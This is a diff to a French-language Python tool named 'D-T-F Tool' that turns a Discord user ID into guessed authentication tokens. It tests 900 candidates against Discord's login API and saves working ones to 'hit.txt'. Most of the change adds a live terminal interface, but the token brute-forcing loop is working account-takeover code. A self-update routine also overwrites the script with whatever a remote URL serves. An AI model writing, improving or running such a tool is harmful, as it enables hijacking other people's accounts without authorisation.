@@ -1,4 +1,5 @@
 import base64
+import os
 import random
 import string
 import requests
@@ -8,6 +9,9 @@ from rich.layout import Layout
 from rich.panel import Panel
 from rich.text import Text
 from rich.table import Table
+from rich.live import Live
+from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
+from rich.align import Align
 
 # Initialisation de Colorama et Rich
 init(autoreset=True)
@@ -23,14 +27,20 @@ def check_updates():
     try:
         response = requests.get(UPDATE_URL)
         if response.status_code == 200:
-            with open(LOCAL_SCRIPT, "r") as local_file:
-                if local_file.read() != response.text:
-                    with open(LOCAL_SCRIPT, "w") as local_file:
-                        local_file.write(response.text)
-                    console.print("[green]Mise à jour appliquée. Redémarrez le script ![/green]")
-                    exit()
-                else:
-                    console.print("[green]Script à jour ![/green]")
+            if not os.path.exists(LOCAL_SCRIPT):
+                with open(LOCAL_SCRIPT, "w") as local_file:
+                    local_file.write(response.text)
+                console.print("[green]Script téléchargé. Redémarrez le script ![/green]")
+                exit()
+            else:
+                with open(LOCAL_SCRIPT, "r") as local_file:
+                    if local_file.read() != response.text:
+                        with open(LOCAL_SCRIPT, "w") as local_file:
+                            local_file.write(response.text)
+                        console.print("[green]Mise à jour appliquée. Redémarrez le script ![/green]")
+                        exit()
+                    else:
+                        console.print("[green]Script à jour ![/green]")
         else:
             console.print("[red]Impossible de vérifier les mises à jour.[/red]")
     except Exception as e:
@@ -48,77 +58,154 @@ def generate_token(id_to_token):
 def main():
     # Afficher le logo au centre
     logo = """
-┳┓  ┏┳┓  ┏┓
-┃┃   ┃   ┣ 
-┻┛   ┻   ┻ 
-EZIO/ErrorNoName        
+    ┳┓  ┏┳┓  ┏┓
+    ┃┃   ┃   ┣ 
+    ┻┛   ┻   ┻ 
+    EZIO/ErrorNoName        
     """
-    console.print(Panel(Text(logo, justify="center"), title="D-T-F Tool", style="bold cyan", expand=True))
+    logo_panel = Panel(
+        Align.center(Text(logo, justify="center"), vertical="middle"),
+        title="D-T-F Tool",
+        style="bold cyan",
+        expand=False
+    )
+    console.print(logo_panel)
 
     # Vérification des mises à jour
     check_updates()
 
     # Créer une interface centrée pour saisir l'ID
-    id_box = Panel(
-        Text("Entrez votre ID pour générer les tokens :\n", justify="center"),
+    id_prompt = Panel(
+        Align.center(Text("Entrez votre ID pour générer les tokens :", justify="center"), vertical="middle"),
         title="Saisie de l'ID",
         style="bold magenta",
-        expand=True,
+        expand=False,
     )
-    console.print(id_box)
-    id_input = console.input("[bold cyan]→ ID TO TOKEN : [/]")
+    console.print(id_prompt)
+    id_input = console.input("[bold cyan]→ ID TO TOKEN : [/]").strip()
+
+    # Vérifier que l'ID n'est pas vide
+    if not id_input:
+        console.print("[red]L'ID ne peut pas être vide. Veuillez redémarrer le script et entrer un ID valide.[/red]")
+        return
 
     # Encodage de l'ID
     id_to_token = base64.b64encode(id_input.encode("ascii")).decode("ascii")
 
     # Boîte d'attente avec bouton simulé
-    console.print(
-        Panel(
-            Text("[bold green]Appuyez sur [ Entrée ] pour démarrer la génération et la vérification des tokens ![/bold green]", justify="center"),
-            style="bold blue",
-        )
+    start_prompt = Panel(
+        Align.center(Text("Appuyez sur [bold green][Entrée][/bold green] pour démarrer la génération et la vérification des tokens !", justify="center"), vertical="middle"),
+        style="bold blue",
+        expand=False,
     )
+    console.print(start_prompt)
     console.input("")  # Attente de validation
 
-    # Initialisation des tableaux pour les résultats
+    # Initialisation des listes pour les résultats
     valid_tokens = []
     invalid_tokens = []
+    total_tokens = 900  # Nombre total de tokens à générer
 
-    # Progression
-    console.print("[cyan]Génération des tokens en cours...[/cyan]")
-    for _ in range(100):  # Nombre de tokens à tester
-        token = generate_token(id_to_token)
-        headers = {'Authorization': token}
-        response = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
+    # Création des tables pour les tokens valides et invalides
+    table_valid = Table(title="Tokens Valides", show_header=True, header_style="bold green")
+    table_valid.add_column("Token", justify="center", style="green")
 
-        if response.status_code == 200:
-            valid_tokens.append(token)
-        else:
-            invalid_tokens.append(token)
+    table_invalid = Table(title="Tokens Invalides", show_header=True, header_style="bold red")
+    table_invalid.add_column("Token", justify="center", style="red")
 
-    # Résultats dans des tableaux Rich
-    table_valid = Table(title="Tokens Valides")
-    table_valid.add_column("Token", justify="center")
-    for token in valid_tokens:
-        table_valid.add_row(f"[green]{token}[/green]")
-
-    table_invalid = Table(title="Tokens Invalides")
-    table_invalid.add_column("Token", justify="center")
-    for token in invalid_tokens:
-        table_invalid.add_row(f"[red]{token}[/red]")
-
+    # Configuration du layout pour afficher les tables côte à côte
     layout = Layout()
-    layout.split_row(
-        Panel(table_valid, title="Résultats Valides", style="bold green"),
-        Panel(table_invalid, title="Résultats Invalides", style="bold red"),
+
+    # Diviser la mise en page en header, body et footer
+    layout.split_column(
+        Layout(name="header", size=10),
+        Layout(name="body", ratio=1),
+        Layout(name="footer", size=3),
     )
-    console.print(layout)
+
+    # Header avec le logo
+    layout["header"].update(
+        Panel(
+            Align.center(Text(logo, justify="center"), vertical="middle"),
+            style="bold cyan"
+        )
+    )
+
+    # Body divisé en deux colonnes pour les tables
+    layout["body"].split_row(
+        Layout(Panel(table_valid, title="Résultats Valides", style="bold green")),
+        Layout(Panel(table_invalid, title="Résultats Invalides", style="bold red")),
+    )
+
+    # Footer avec le compteur
+    footer_panel = Panel(
+        Align.center(Text("Tokens générés : 0/900 | Valides : 0 | Invalides : 0", justify="center"), vertical="middle"),
+        style="bold yellow"
+    )
+    layout["footer"].update(footer_panel)
+
+    # Utilisation de Live pour mettre à jour l'affichage en temps réel
+    with Live(layout, refresh_per_second=10, screen=True, console=console):
+        # Initialisation du compteur
+        tokens_generated = 0
+
+        # Création d'une barre de progression
+        progress = Progress(
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+            TimeElapsedColumn(),
+            transient=True,
+            console=console,
+        )
+        task = progress.add_task("[cyan]Génération et vérification des tokens...", total=total_tokens)
+
+        # Boucle de génération et de vérification des tokens
+        for _ in range(total_tokens):
+            token = generate_token(id_to_token)
+            headers = {'Authorization': token}
+            try:
+                response = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
+                if response.status_code == 200:
+                    valid_tokens.append(token)
+                    table_valid.add_row(token)
+                else:
+                    invalid_tokens.append(token)
+                    table_invalid.add_row(token)
+            except requests.RequestException:
+                invalid_tokens.append(token)
+                table_invalid.add_row(token)
+
+            tokens_generated += 1
+            progress.advance(task)
+
+            # Mettre à jour le compteur dans le footer
+            layout["footer"].update(
+                Panel(
+                    Align.center(
+                        Text(f"Tokens générés : {tokens_generated}/{total_tokens} | Valides : {len(valid_tokens)} | Invalides : {len(invalid_tokens)}",
+                             justify="center"),
+                        vertical="middle"
+                    ),
+                    style="bold yellow"
+                )
+            )
+
+        # Attendre que la barre de progression se termine
+        progress.stop()
 
     # Enregistrer les tokens valides dans un fichier
-    with open("hit.txt", "w") as file:
-        for token in valid_tokens:
-            file.write(f"{token}\n")
-    console.print(Panel("[bold cyan]Enregistrement des tokens valides terminé dans 'hit.txt'[/bold cyan]", style="bold green"))
+    with console.status("[cyan]Enregistrement des tokens valides dans 'hit.txt'...", spinner="dots"):
+        try:
+            with open("hit.txt", "w") as file:
+                for token in valid_tokens:
+                    file.write(f"{token}\n")
+            console.print("[green]Enregistrement terminé ![/green]")
+        except Exception as e:
+            console.print(f"[red]Erreur lors de l'enregistrement : {e}[/red]")
+
+    # Afficher un message de fin
+    console.print(Panel("[bold cyan]Processus terminé ![/bold cyan]", style="bold green"))
 
 # Exécution principale
 if __name__ == "__main__":
